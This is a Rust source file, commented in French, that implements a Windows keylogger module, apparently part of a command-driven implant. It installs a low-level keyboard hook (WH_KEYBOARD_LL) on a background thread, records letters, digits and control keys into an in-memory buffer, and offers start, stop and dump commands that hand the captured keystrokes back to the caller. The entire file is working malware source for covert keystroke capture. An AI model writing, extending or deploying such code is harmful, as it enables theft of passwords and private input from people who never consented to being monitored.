// Keylogger via hook bas niveau WH_KEYBOARD_LL sur un thread dédié avec boucle de messages.
// Conforme à la spécification du sujet (MODULES.md) : SetWindowsHookExW + GetMessageW.
// Aucun fichier écrit sur disque — le buffer reste en mémoire.
use std::sync::Mutex;
use std::sync::atomic::{AtomicBool, AtomicU32, Ordering};

static BUFFER: Mutex<Vec<String>> = Mutex::new(Vec::new());
static RUNNING: AtomicBool = AtomicBool::new(false);
// Identifiant du thread portant le hook (pour poster WM_QUIT à l'arrêt).
static HOOK_THREAD_ID: AtomicU32 = AtomicU32::new(0);

pub fn run(args: &str) -> String {
    match args.trim() {
        "start" => start(),
        "stop"  => stop(),
        "dump"  => dump(),
        _       => "keylog <start|stop|dump>".to_string(),
    }
}

fn start() -> String {
    #[cfg(windows)]
    {
        if RUNNING.swap(true, Ordering::SeqCst) {
            return "déjà en cours".to_string();
        }
        BUFFER.lock().unwrap().clear();
        std::thread::spawn(hook_thread);
        "keylog démarré (WH_KEYBOARD_LL)".to_string()
    }
    #[cfg(not(windows))]
    "keylog disponible sur Windows uniquement".to_string()
}

fn stop() -> String {
    RUNNING.store(false, Ordering::SeqCst);
    #[cfg(windows)]
    {
        let tid = HOOK_THREAD_ID.load(Ordering::SeqCst);
        if tid != 0 {
            unsafe {
                windows_sys::Win32::UI::WindowsAndMessaging::PostThreadMessageW(
                    tid,
                    windows_sys::Win32::UI::WindowsAndMessaging::WM_QUIT,
                    0,
                    0,
                );
            }
        }
    }
    "keylog arrêté".to_string()
}

fn dump() -> String {
    let mut buf = BUFFER.lock().unwrap();
    if buf.is_empty() {
        "(buffer vide)".to_string()
    } else {
        let content = buf.join("");
        buf.clear();
        content
    }
}

#[cfg(windows)]
fn hook_thread() {
    use windows_sys::Win32::System::Threading::GetCurrentThreadId;
    use windows_sys::Win32::UI::Input::KeyboardAndMouse::{VK_BACK, VK_RETURN, VK_SPACE};
    use windows_sys::Win32::UI::WindowsAndMessaging::{
        CallNextHookEx, GetMessageW, SetWindowsHookExW, UnhookWindowsHookEx,
        KBDLLHOOKSTRUCT, MSG, WH_KEYBOARD_LL, WM_KEYDOWN, WM_SYSKEYDOWN,
    };

    // Callback bas niveau — appelé dans le contexte de ce thread via GetMessage.
    unsafe extern "system" fn hook_proc(code: i32, wparam: usize, lparam: isize) -> isize {
        if code >= 0
            && (wparam as u32 == WM_KEYDOWN || wparam as u32 == WM_SYSKEYDOWN)
        {
            let ks = &*(lparam as *const KBDLLHOOKSTRUCT);
            let vk = ks.vkCode as u16;
            let ch = match vk {
                v if v == VK_RETURN => "\n".to_string(),
                v if v == VK_SPACE  => " ".to_string(),
                v if v == VK_BACK   => "[BS]".to_string(),
                v if (0x41..=0x5A).contains(&v) => {
                    char::from_u32(v as u32)
                        .map(|c| c.to_string())
                        .unwrap_or_default()
                }
                v if (0x30..=0x39).contains(&v) => {
                    char::from_u32(v as u32)
                        .map(|c| c.to_string())
                        .unwrap_or_default()
                }
                _ => return CallNextHookEx(0, code, wparam, lparam),
            };
            if let Ok(mut buf) = BUFFER.try_lock() {
                buf.push(ch);
            }
        }
        unsafe { CallNextHookEx(0, code, wparam, lparam) }
    }

    HOOK_THREAD_ID.store(unsafe { GetCurrentThreadId() }, Ordering::SeqCst);

    let hook = unsafe { SetWindowsHookExW(WH_KEYBOARD_LL, Some(hook_proc), 0, 0) };

    // Boucle de messages obligatoire pour que le hook LL reçoive les événements.
    let mut msg: MSG = unsafe { std::mem::zeroed() };
    while RUNNING.load(Ordering::Relaxed) {
        // GetMessageW bloque jusqu'à réception d'un message (WM_QUIT compris).
        if unsafe { GetMessageW(&mut msg, 0, 0, 0) } == 0 {
            break; // WM_QUIT reçu depuis stop()
        }
    }

    if hook != 0 {
        unsafe { UnhookWindowsHookEx(hook) };
    }
    HOOK_THREAD_ID.store(0, Ordering::SeqCst);
}
